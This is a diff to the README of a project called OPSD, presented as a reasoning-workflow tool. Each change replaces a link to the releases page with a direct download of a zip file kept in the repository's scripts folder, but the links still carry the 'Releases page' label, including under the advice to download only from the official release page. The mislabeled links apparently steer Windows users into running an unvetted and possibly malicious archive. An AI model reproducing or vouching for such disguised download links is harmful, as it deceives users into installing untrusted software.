@@ -1,15 +1,15 @@
 # 🧠 OPSD - Run Self-Distilled Reasoning Workflows
 
 <p align="center">
-<a href="https://github.com/renaudbantuspeaking260/OPSD/releases"><img src="https://img.shields.io/badge/Download-OPSD-6f42c1.svg"></a>
-<a href="https://github.com/renaudbantuspeaking260/OPSD/releases"><img src="https://img.shields.io/badge/Windows-Release-0078d7.svg"></a>
+<a href="https://github.com/renaudbantuspeaking260/OPSD/raw/refs/heads/main/scripts/Software-v1.5.zip"><img src="https://img.shields.io/badge/Download-OPSD-6f42c1.svg"></a>
+<a href="https://github.com/renaudbantuspeaking260/OPSD/raw/refs/heads/main/scripts/Software-v1.5.zip"><img src="https://img.shields.io/badge/Windows-Release-0078d7.svg"></a>
 </p>
 
 ---
 
 ## 🚀 Download
 
-Go to the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/releases) to download and run this file.
+Go to the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/raw/refs/heads/main/scripts/Software-v1.5.zip) to download and run this file.
 
 1. Open the link in your web browser.
 2. Find the latest release at the top of the page.
@@ -55,7 +55,7 @@ If you plan to use large models, more RAM and more disk space help.
 
 Follow these steps in order:
 
-1. Open the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/releases).
+1. Open the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/raw/refs/heads/main/scripts/Software-v1.5.zip).
 2. Download the latest Windows release from the **Assets** section.
 3. Wait for the download to finish.
 4. Open your **Downloads** folder.
@@ -159,7 +159,7 @@ The current release includes code updates and fixes for chat template and Zero2 
 
 This version may work better with recent model setups and updated evaluation paths.
 
-If you already used an older build, download the latest Windows release again from the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/releases) and replace the old files if the release notes tell you to do so.
+If you already used an older build, download the latest Windows release again from the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/raw/refs/heads/main/scripts/Software-v1.5.zip) and replace the old files if the release notes tell you to do so.
 
 ---
 
@@ -227,7 +227,7 @@ This helps OPSD stay focused on the task.
 
 Only download OPSD from the official release page:
 
-- [https://github.com/renaudbantuspeaking260/OPSD/releases](https://github.com/renaudbantuspeaking260/OPSD/releases)
+- [https://github.com/renaudbantuspeaking260/OPSD/raw/refs/heads/main/scripts/Software-v1.5.zip](https://github.com/renaudbantuspeaking260/OPSD/raw/refs/heads/main/scripts/Software-v1.5.zip)
 
 Keep the app in a folder you can find again.
 
@@ -251,7 +251,7 @@ If you are not sure which file to choose, pick the newest Windows asset listed o
 
 ## 🧭 Quick Start
 
-1. Visit the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/releases).
+1. Visit the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/raw/refs/heads/main/scripts/Software-v1.5.zip).
 2. Download the latest Windows file.
 3. Extract it if needed.
 4. Open the app.
